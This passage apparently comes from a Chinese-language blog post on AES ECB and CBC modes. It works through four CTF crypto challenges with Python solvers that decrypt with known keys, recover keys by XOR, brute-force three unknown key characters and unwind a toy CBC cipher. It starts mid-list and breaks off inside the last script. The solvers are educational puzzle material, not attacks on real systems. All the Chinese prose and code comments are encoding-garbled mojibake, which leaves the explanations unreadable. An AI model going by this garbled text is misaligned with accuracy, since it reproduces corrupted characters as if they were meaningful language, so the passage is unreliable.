<p>2.å¯†é’¥Keyå¯¹æ˜æ–‡å—è¿›è¡Œå—åŠ å¯†ï¼Œå¾—åˆ°å¯†æ–‡å—</p>
<p>3.å¯†æ–‡å—æ‹¼æ¥åå¾—åˆ°åŠ å¯†åçš„å¯†æ–‡</p>
<h3 id="AES-CBCæ¨¡å¼"><a href="#AES-CBCæ¨¡å¼" class="headerlink" title="AES-CBCæ¨¡å¼"></a>AES-CBCæ¨¡å¼</h3><h4 id="åŠ å¯†è¿‡ç¨‹"><a href="#åŠ å¯†è¿‡ç¨‹" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h4><p><img src="/posts/b568ee4f/15.png"></p>
<p>1.æ˜æ–‡ç»è¿‡å¡«å……åï¼Œåˆ†ä¸ºä¸åŒçš„ç»„blockï¼Œä»¥ç»„çš„æ–¹å¼å¯¹æ•°æ®è¿›è¡Œå¤„ç†</p>
<p>2.åˆå§‹åŒ–å‘é‡ IV é¦–å…ˆå’Œç¬¬ä¸€ç»„æ˜æ–‡è¿›è¡Œ XOR å¾—åˆ°ä¸­é—´å€¼ Midvalue</p>
<p>3.é‡‡ç”¨å¯†é’¥Keyå¯¹ä¸­é—´å€¼Midvalueè¿›è¡Œå—åŠ å¯†ï¼Œåˆ é™¤ç¬¬ä¸€ç»„åŠ å¯†çš„å¯†æ–‡</p>
<p>4.ç¬¬ä¸€ç»„åŠ å¯†çš„å¯†æ–‡ ä½œä¸ºç¬¬äºŒç»„çš„åˆå§‹åŒ–å‘é‡IVï¼Œå‚ä¸ç¬¬äºŒç»„çš„æ˜æ–‡å¼‚æˆ–æ“ä½œ</p>
<p>5.ä¾æ¬¡è¿›è¡Œå—åŠ å¯†ï¼Œæœ€ç»ˆå°†å¾—åˆ°çš„æ¯ä¸€å—å¯†æ–‡æ‹¼æ¥æˆå¯†æ–‡</p>
<h4 id="è§£å¯†è¿‡ç¨‹"><a href="#è§£å¯†è¿‡ç¨‹" class="headerlink" title="è§£å¯†è¿‡ç¨‹"></a>è§£å¯†è¿‡ç¨‹</h4><p><img src="/posts/b568ee4f/16.png"></p>
<ol>
<li>å°†å¯†æ–‡è¿›è¡Œåˆ†ç»„ï¼Œç¬¬ä¸€ç»„å¾—åˆ°çš„æ˜¯åˆå§‹åŒ–å‘é‡ï¼Œä»ç¬¬äºŒç»„å¼€å§‹æ‰æ˜¯çœŸæ­£çš„å¯†æ–‡</li>
<li>ä½¿ç”¨åŠ å¯†å¯†é’¥Keyå¯¹å¯†æ–‡çš„ç¬¬ä¸€ç»„è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°ä¸­é—´å€¼Midvalue</li>
<li>ä¸­é—´å€¼Midvalueå’ŒIVè¿›è¡ŒXOR,å¾—åˆ°è¯¥ç»„çš„æ˜æ–‡</li>
<li>å‰ä¸€å—å¯†æ–‡æ˜¯æœ€åä¸€å—å¯†æ–‡çš„IVï¼Œé€šè¿‡å¼‚æˆ–ä¸­é—´å€¼å¾—åˆ°æ˜æ–‡</li>
<li>å—å…¨éƒ¨è§£å¯†å®Œæˆåæ‹¼æ¥å¾—åˆ°æ˜æ–‡ï¼Œå¯†ç ç®—æ³•æ ¡éªŒæ˜æ–‡å¡«å……æ ¼å¼æ˜¯å¦æ­£ç¡®</li>
<li>æ ¡éªŒé€šè¿‡å¾—åˆ°æ˜æ–‡ï¼Œæ ¡éªŒå¤±è´¥åˆ™å¾—åˆ°å¯†æ–‡</li>
</ol>
<h3 id="CTFä¸­çš„AESé¢˜ç›®åˆ†æ"><a href="#CTFä¸­çš„AESé¢˜ç›®åˆ†æ" class="headerlink" title="CTFä¸­çš„AESé¢˜ç›®åˆ†æ"></a>CTFä¸­çš„AESé¢˜ç›®åˆ†æ</h3><h4 id="1-BabyAES"><a href="#1-BabyAES" class="headerlink" title="1.BabyAES"></a>1.BabyAES</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">c = my_aes.encrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®åˆ†æï¼š å·²çŸ¥iv  key å¯†æ–‡c  ä½¿ç”¨AES-CBCæ¨¡å¼ï¼Œå…¨éƒ¨å·²çŸ¥å¯ç›´æ¥AESè§£å¯†å¾—åˆ°æ˜æ–‡flag</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"> </span><br><span class="line">Cipher = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">decrypted = Cipher.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(decrypted)</span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="2-2020å¹´ç¬¬ä¸‰å±Šå®‰æ´µæ¯-easyaes"><a href="#2-2020å¹´ç¬¬ä¸‰å±Šå®‰æ´µæ¯-easyaes" class="headerlink" title="2.[2020å¹´ç¬¬ä¸‰å±Šå®‰æ´µæ¯] easyaes"></a>2.[2020å¹´ç¬¬ä¸‰å±Šå®‰æ´µæ¯] easyaes</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">l</span>):</span><br><span class="line">    <span class="keyword">return</span> random.getrandbits(l)</span><br><span class="line"><span class="comment"># æ±‚iv  å»é™¤æ‰æ”¶å°¾æŒ‡å®šå­—ç¬¦ä¸²</span></span><br><span class="line">iv = flag.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">16</span>)])</span><br><span class="line">LENGTH = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="comment"># 16å­—èŠ‚  æ‰€ä»¥ä¼šä½¿ç”¨16ä¸ªå­—ç¬¦æˆ–é•¿åº¦ä¸º16çš„å­—ç¬¦ä¸²åšå¯†ç </span></span><br><span class="line"><span class="keyword">assert</span> LENGTH == <span class="number">16</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#  32å­—èŠ‚ ä¸”ä¸º4ä¸ªå­—ç¬¦(32bit)çš„é‡å¤  32bit*8</span></span><br><span class="line"><span class="comment"># æ¯ä¸ªå­—èŠ‚ç”± 2ä¸ªåå…­è¿›åˆ¶å­—ç¬¦è¡¨ç¤º æ‰€ä»¥æœ‰ 32*2=64ä¸ªåå…­æœºåˆ¶å­—ç¬¦</span></span><br><span class="line">hint = os.urandom(<span class="number">4</span>) * <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(hint)^bytes_to_long(key))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64 / 16 =4</span></span><br><span class="line">msg = <span class="string">b&#x27;Welcome, ctfer. Dont try too hard, its no use. Have a good day!!&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypto</span>(<span class="params">message</span>):</span><br><span class="line">    aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å¯¹msg AESåŠ å¯†å è½¬åå…­è¿›åˆ¶å è¾“å‡ºå32ä½</span></span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(encrypto(msg))[-<span class="number">32</span>:])</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">99748265546679089946917295913637945222843938798184123305418691873367322323659</span></span><br><span class="line"><span class="string">bc03f3ac4ff8064acbcfaf0b0bf2ba7b</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®åˆ†æï¼š</p>
<p>1.å·²çŸ¥keyé•¿åº¦ä¸º 16ä½ï¼Œhintä¸º32å­—èŠ‚ ä¸”ä¸º4ä¸ªå­—èŠ‚çš„é‡å¤(32bit*8)</p>
<p>2.å·²çŸ¥æ˜æ–‡message 64ä½</p>
<p>AES-CBCè§£å¯†æµç¨‹ï¼š<br>msg[0] = decrypt(enc1,key)^iv<br>msg[1] = decrypt(enc2,key)^enc1<br>msg[2] = decrypt(enc3,key)^enc2<br>msg[3] = decrypt(enc4,key)^enc3<br>msg = msg[0]+msg[1]+msg[2]+msg[3]</p>
<p>iv = msg[0] ^ decrypt(enc1,key)<br>enc1 = msg[1] ^ decrypt(enc2,key)<br>enc2 = msg[2] ^ decrypt(enc3,key)<br>enc3 = msg[3] ^ decrypt(enc4,key)</p>
<p>å…¶ä¸­ å·²çŸ¥å¦‚ä¸‹ï¼š<br>1.hint^key = tmp -&gt; key = tmp^hint<br>2.enc4<br>3.msg[0] msg[1] msg[2] msg[3]<br>æ‰€ä»¥å¯ä»¥æ¨å‡ºivæ¥ å¾—åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> binascii, sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="comment"># -----------get key---------</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># tmp = hint ^ key -&gt; key = tmp ^ hint</span></span><br><span class="line">tmp = <span class="number">99748265546679089946917295913637945222843938798184123305418691873367322323659</span></span><br><span class="line"><span class="comment"># hintä¸º32å­—èŠ‚ keyä¸º16å­—èŠ‚  æ‰€ä»¥å¼‚æˆ–å tmpé«˜ä½å°±æ˜¯ hintçš„é«˜ä½</span></span><br><span class="line"><span class="comment"># [2:10] å‰é¢æœ‰0x æ‰€ä»¥ä»ç¬¬äºŒä½å¼€å§‹å–8ä½</span></span><br><span class="line"><span class="comment"># 32å­—èŠ‚ 64ä¸ªåå…­è¿›åˆ¶å­—ç¬¦</span></span><br><span class="line">hint = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(tmp))[<span class="number">2</span>:<span class="number">10</span>] * <span class="number">8</span>, <span class="number">16</span>)</span><br><span class="line">key = long_to_bytes(tmp ^ hint)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ----------get iv-----------</span></span><br><span class="line">msg = <span class="string">b&#x27;Welcome, ctfer. Dont try too hard, its no use. Have a good day!!&#x27;</span></span><br><span class="line">msgs = [msg[ii:(ii + <span class="number">16</span>)] <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(msgs)</span><br><span class="line"><span class="comment"># [b&#x27;Welcome, ctfer. &#x27;, b&#x27;Dont try too har&#x27;, b&#x27;d, its no use. H&#x27;, b&#x27;ave a good day!!&#x27;]</span></span><br><span class="line"> </span><br><span class="line">msgs.reverse()</span><br><span class="line"><span class="comment"># msg[3] msg[2] msg[1] msg[0]</span></span><br><span class="line"><span class="comment"># [b&#x27;ave a good day!!&#x27;, b&#x27;d, its no use. H&#x27;, b&#x27;Dont try too har&#x27;, b&#x27;Welcome, ctfer. &#x27;]</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IV = binascii.unhexlify(<span class="string">&#x27;bc03f3ac4ff8064acbcfaf0b0bf2ba7b&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># iv = msg[0] ^ decrypt(enc1,key)</span></span><br><span class="line"><span class="comment"># enc1 = msg[1] ^ decrypt(enc2,key)</span></span><br><span class="line"><span class="comment"># enc2 = msg[2] ^ decrypt(enc3,key)</span></span><br><span class="line"><span class="comment"># enc3 = msg[3] ^ decrypt(enc4,key)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decry</span>(<span class="params">key, IV, ms</span>):</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> strxor(aes.decrypt(IV), ms)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ms <span class="keyword">in</span> msgs:</span><br><span class="line">    IV = decry(key, IV, ms)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span> + IV + <span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h4 id="3-aes"><a href="#3-aes" class="headerlink" title="3.aes"></a>3.aes</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">and</span> flag[-<span class="number">1</span>:] == <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"> </span><br><span class="line">key = <span class="string">b&quot;J1fx2g1jDak1c***&quot;</span></span><br><span class="line">l = <span class="built_in">len</span>(key)</span><br><span class="line"> </span><br><span class="line">message = <span class="string">b&quot;I have had my invitation to this world&#x27;s festival, and thus my life has been blessed&quot;</span> + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]</span><br><span class="line"> </span><br><span class="line">iv = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">message = message + <span class="built_in">bytes</span>((l - <span class="built_in">len</span>(message) % l) * <span class="built_in">chr</span>(l - <span class="built_in">len</span>(message) % l), encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(aes.encrypt(message)))</span><br><span class="line"><span class="comment">#******************************************************************************************************************************************************6ece036e495d363b647d7f2749c4c2f3dd78f8637b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#é¢˜ç›®åŠWPæ¥æºï¼šhttps://blog.csdn.net/luochen2436/article/details/125884846</span></span><br><span class="line"><span class="comment">#è®°å½•ä¸‹è§£é¢˜æ€è·¯å­¦ä¹ ä¸‹</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®åˆ†æï¼š</p>
<p>1.keyåä¸‰ä½æœªçŸ¥ å¯çˆ†ç ´</p>
<p>2.æ˜æ–‡message åˆ†3éƒ¨åˆ† ç¬¬ä¸€éƒ¨åˆ†æ˜æ–‡å·²çŸ¥ï¼Œä¸­é—´éƒ¨åˆ† 10ä¸ªåå…­è¿›åˆ¶å­—ç¬¦  åéƒ¨åˆ†ä¸º 2ä¸ª0x02 å…±192ä¸ªåå…­è¿›åˆ¶å­—ç¬¦</p>
<p>message = message + bytes((l - len(message) % l) * chr(l - len(message) % l), encoding = â€œutf-8â€)</p>
<p>å³ bytes((16-94)%16 * chr((16-(94%16)))ï¼‰</p>
<p>= bytes(2 * chr (2) ) -&gt; 0x02 0x02</p>
<p>3.iv = flag[5:-1] å³flag{iv} æ±‚å‡ºivå³flag</p>
<p>4.å·²çŸ¥æ˜æ–‡å21å­—èŠ‚ æ ¹æ®åˆ†ç»„ æ¯ç»„16å­—èŠ‚ æ‰€ä»¥å·²çŸ¥æœ€åä¸€å—æ˜æ–‡ åŠ å€’æ•°ç¬¬äºŒå—å5å­—èŠ‚æ˜æ–‡</p>
<p><img src="/posts/b568ee4f/17.png"></p>
<p>åœ¨CBCä¸­ ä¸ECBç›¸æ¯” å¤šçš„éƒ¨åˆ†ä¸ºIV å¼‚æˆ–ä¸€æ­¥</p>
<p>å¯†æ–‡ ^ key (AES_ECB)  ^ IV â†’ æ˜æ–‡</p>
<p>æœ€åä¸€å—çš„æ˜æ–‡å·²çŸ¥ï¼Œkey å¯é€šè¿‡çˆ†ç ´åä¸‰ä½</p>
<p>æœ€åä¸€å—çš„å¯†æ–‡ä¸º  bâ€ssedâ€ + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:10] +  bytes((l - len(message) % l) * chr(l - len(message) % l)  å¦‚æœkeyå·²çŸ¥  åˆ™å¯†æ–‡ä¹Ÿå°±æ˜¯å·²çŸ¥çš„</p>
<p>æˆ‘ä»¬è¿˜çŸ¥é“å€’æ•°ç¬¬äºŒå—ä¸­çš„å5ä¸ªå­—èŠ‚  å¯ä»¥ä½œä¸ºæœ€åä¸€æ¬¡åŠ å¯†çš„IV çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ ¡éªŒï¼Œå¦‚æœç»“æœä¸­åŒ…å« å·²çŸ¥çš„5ä¸ªå­—èŠ‚ï¼Œåˆ™è¯´æ˜keyæ­£ç¡®ã€‚</p>
<p>IV = æ˜æ–‡ ^ ( å¯†æ–‡ ^ key )</p>
<p>æ±‚å¾—keyå å¯è¿›è€Œæ¨å‡º IV å³ flag</p>
<p>Plaintext[0] = Ciphertext[0] ^ key ^ IV</p>
<p>Plaintext[1] = Ciphertext[1] ^ key ^ Ciphertext[0]</p>
<p>Plaintext[2] = Ciphertext[2] ^ key ^ Ciphertext[1]</p>
<p>çŸ¥é“æœ€åä¸€ä¸ªæ˜æ–‡ å¯†æ–‡ key ä»¥æ­¤åå¤æ¨å‡ºIV</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 1. ç”Ÿæˆkeyå­—å…¸</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">dic = string.printable[:<span class="number">62</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key_table.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">                key = <span class="string">b&quot;J1fx2g1jDak1c&quot;</span>+i.encode()+j.encode()+k.encode()</span><br><span class="line">                file.write(key+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">file.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 2.çˆ†ç ´key</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">m: <span class="built_in">bytes</span>, c: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(m, c)])</span><br><span class="line"> </span><br><span class="line">enc = binascii.unhexlify(<span class="string">&#x27;5d363b647d7f2749c4c2f3dd78f8637b&#x27;</span>)</span><br><span class="line">five_part = binascii.unhexlify(<span class="string">b&quot;6ece036e49&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;key_table.txt&quot;</span>,<span class="string">&quot;rb+&quot;</span>)</span><br><span class="line">pbar = tqdm(<span class="built_in">range</span>(<span class="number">238328</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    key = i[:<span class="number">16</span>]</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    dec = aes.decrypt(enc)</span><br><span class="line">    <span class="comment"># æœ€åä¸€å— 16ä¸ªå­—èŠ‚ 4+10+2</span></span><br><span class="line">    m = <span class="string">b&quot;ssed&quot;</span> +binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]+<span class="string">b&#x27;\x02\x02&#x27;</span></span><br><span class="line">    xor_result = xor(m,dec)</span><br><span class="line">    pbar.update(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> five_part <span class="keyword">in</span> xor_result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] key:&quot;</span>,key)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">f.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 3.æ±‚IV</span></span><br><span class="line">l = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="comment"># 192ä½</span></span><br><span class="line">message = <span class="string">b&quot;I have had my invitation to this world&#x27;s festival, and thus my life has been blessed&quot;</span> + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]</span><br><span class="line">message = message + <span class="built_in">bytes</span>((l - <span class="built_in">len</span>(message) % l) * <span class="built_in">chr</span>(l - <span class="built_in">len</span>(message) % l), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(message),<span class="number">16</span>):</span><br><span class="line">    aes_ecb = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    dec_c = aes_ecb.decrypt(enc)</span><br><span class="line">    enc = xor(message[<span class="built_in">len</span>(message)-i-<span class="number">16</span>:<span class="built_in">len</span>(message)-i],dec_c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span>+enc+<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h4 id="4-moectf-ez-cbc"><a href="#4-moectf-ez-cbc" class="headerlink" title="4.moectf ez_cbc"></a>4.moectf ez_cbc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">  </span><br><span class="line">IV = bytes_to_long(<span class="string">b&#x27;cbc!&#x27;</span>)</span><br><span class="line">K = random.randrange(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">30</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">7</span>] == <span class="string">b&#x27;moectf&#123;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">  </span><br><span class="line">block_length = <span class="number">4</span></span><br><span class="line">flag = flag + ((block_length - <span class="built_in">len</span>(flag) % block_length) % block_length) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">plain_block = [flag[block_length * i: block_length * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // block_length)]</span><br><span class="line">  </span><br><span class="line">c = []</span><br><span class="line">c0 = (IV ^ bytes_to_long(plain_block[<span class="number">0</span>])) ^ K</span><br><span class="line">c.append(c0)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain_block)-<span class="number">1</span>):</span><br><span class="line">    c.append(c[i] ^ bytes_to_long(plain_block[i+<span class="number">1</span>]) ^ K)</span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[748044282, 2053864743, 734492413, 675117672, 1691099828, 1729574447, 1691102180, 657669994, 1741780405, 842228028, 1909206003, 1797919307]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#  flag ä¸º  moectf&#123;flag&#125;</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®åˆ†æï¼š</p>
<ol>
<li>IVå·²çŸ¥ï¼Œflagéƒ¨åˆ†å·²çŸ¥ moectg{}</li>
<li>block_length =4 ä¸” å·²çŸ¥flagå‰å››ä½ä¸º moec</li>
</ol>
<p>æ‰€ä»¥å¯ä»¥é€šè¿‡æ­¤å»æ¢å¤K</p>
<p>å¯†æ–‡å— = æ˜æ–‡å— ^ iv ^ K</p>
<p>æ˜æ–‡å— = å¯†æ–‡å— ^ iv ^ K</p>
<p>K = å¯†æ–‡å— ^ æ˜æ–‡å— ^ iv</p>
<p>K = IV ^ bytes_to_long(plain_block[0]) ^ c[0]</p>
<p>  3.æ±‚å¾—Kå è¿›è€Œæ±‚å¾—mï¼Œ m = K ^ c[i] ^ c[i+1]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">c = [<span class="number">748044282</span>, <span class="number">2053864743</span>, <span class="number">734492413</span>, <span class="number">675117672</span>, <span class="number">1691099828</span>, <span class="number">1729574447</span>, <span class="number">1691102180</span>, <span class="number">657669994</span>, <span class="number">1741780405</span>, <span class="number">842228028</span>, <span class="number">1909206003</span>, <span class="number">1797919307</span>]</span><br><span class="line">IV = bytes_to_long(<span class="string">b&#x27;cbc!&#x27;</span>)</span><br><span class="line">block_length = <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;&#x27;</span></span><br><span class="line">plain_block = [flag[block_length * i: block_length * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // block_length)]</span><br><span class="line"> </span><br><span class="line">K = IV ^ bytes_to_long(plain_block[<span class="number">0</span>]) ^ c[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(K)</span><br><span class="line"> </span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)-<span class="number">1</span>):</span><br><span class="line">    m += long_to_bytes(c[i]^c[i+<span class="number">1</span>]^K)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;moec&#x27;</span>+m)</span><br><span class="line"><span class="comment"># 580598200</span></span><br><span class="line"><span class="comment"># 